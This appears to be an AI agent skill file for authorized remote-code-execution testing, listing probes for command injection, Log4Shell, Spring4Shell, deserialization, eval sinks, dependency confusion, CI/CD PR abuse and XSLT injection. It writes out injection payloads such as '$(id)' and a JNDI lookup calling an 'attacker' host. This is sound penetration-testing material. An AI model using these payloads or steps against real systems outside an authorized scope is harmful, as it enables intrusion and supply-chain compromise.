---
name: claude-rce-security-skill
description: Assess paths where attacker-controlled input can cause unintended operating-system or runtime code execution.
---

# RCE security assessment

Assess paths where attacker-controlled input can cause unintended operating-system or runtime code execution.

## Shared rules

Follow the authorization rules, assessment workflow, and finding format in [testing-rules](../testing-rules/SKILL.md). Load that skill before testing; do not proceed without confirmed authorization and scope.

## Category-specific focus

Use the prompts below to guide a focused **RCE** review. Translate each hypothesis into a safe, authorized test and preserve the evidence needed to reproduce or remediate it.

## Confirmed vs. false positive

- **Confirmed when:** Out-of-band proof (callback, or a time delay tied directly to the payload) shows the target executed attacker-supplied code or commands, reproduced safely with a non-destructive payload.
- **False positive when:** A delay or error also occurs with syntactically invalid, non-executing input, or the output is explainable by ordinary request processing.

## Prompt catalog

### 108. Command injection via input

- **Difficulty:** MED
- **Slug:** `command-injection-via-input`
- **Source prompt:** For every input that might reach a shell (filenames, ping/lookup tools, image processing), append `; id`, `| id`, `\`id\``, `$(id)`, `%0aid`. Report any command output.
- **Steps:**
  1. For every input that might reach a shell (filenames, ping/lookup tools, image processing), append `; id`, `| id`, `\`id\``, `$(id)`, `%0aid`.
  2. Report any command output.

### 109. ImageMagick / Ghostscript exploit

- **Difficulty:** HARD
- **Slug:** `imagemagick-ghostscript-exploit`
- **Source prompt:** Upload a crafted MVG/SVG/EPS file exploiting known IM/GS RCEs. Test target's image processing pipeline.
- **Steps:**
  1. Upload a crafted MVG/SVG/EPS file exploiting known IM/GS RCEs.
  2. Test target's image processing pipeline.

### 110. Log4Shell-style template injection

- **Difficulty:** HARD
- **Slug:** `log4shell-style-template-injection`
- **Source prompt:** Submit `${jndi:ldap://attacker/x}` and `${env:PATH}` in every input — User-Agent, headers, form fields. Listen for DNS/LDAP callbacks.
- **Steps:**
  1. Submit `${jndi:ldap://attacker/x}` and `${env:PATH}` in every input — User-Agent, headers, form fields.
  2. Listen for DNS/LDAP callbacks.

### 111. Spring4Shell / class.module RCE

- **Difficulty:** HARD
- **Slug:** `spring4shell-class-module-rce`
- **Source prompt:** If app is Spring, test for `class.module.classLoader.*` parameter injection.

### 112. Deserialization gadget chain

- **Difficulty:** HARD
- **Slug:** `deserialization-gadget-chain`
- **Source prompt:** Submit known ysoserial gadgets to endpoints accepting serialized Java/PHP/.NET objects.

### 113. Eval-based RCE in admin tools

- **Difficulty:** HARD
- **Slug:** `eval-based-rce-in-admin-tools`
- **Source prompt:** Look for `eval(`, `exec(`, `Function(`, `pickle.loads(`, `yaml.load(` in client-exposed code paths. Test for injection.
- **Steps:**
  1. Look for `eval(`, `exec(`, `Function(`, `pickle.loads(`, `yaml.load(` in client-exposed code paths.
  2. Test for injection.

### 114. RCE via dependency confusion

- **Difficulty:** HARD
- **Slug:** `rce-via-dependency-confusion`
- **Source prompt:** Check if internal package names are published to public registries. If not, publish a stub and watch for installs.
- **Steps:**
  1. Check if internal package names are published to public registries.
  2. If not, publish a stub and watch for installs.

### 115. RCE via CI/CD on PR

- **Difficulty:** HARD
- **Slug:** `rce-via-ci-cd-on-pr`
- **Source prompt:** If the project has a public CI, push a PR modifying `.github/workflows` or build scripts. Test if it runs on `pull_request` with secrets.
- **Steps:**
  1. If the project has a public CI, push a PR modifying `.github/workflows` or build scripts.
  2. Test if it runs on `pull_request` with secrets.

### 116. RCE via SSTI

- **Difficulty:** HARD
- **Slug:** `rce-via-ssti`
- **Source prompt:** See SSTI prompts — many SSTI gadgets lead to direct RCE.

### 117. RCE via XSLT injection

- **Difficulty:** HARD
- **Slug:** `rce-via-xslt-injection`
- **Source prompt:** If app does XSLT transforms on user input, test `xsl:value-of select="system-property('xsl:vendor')"` and document() exploits.
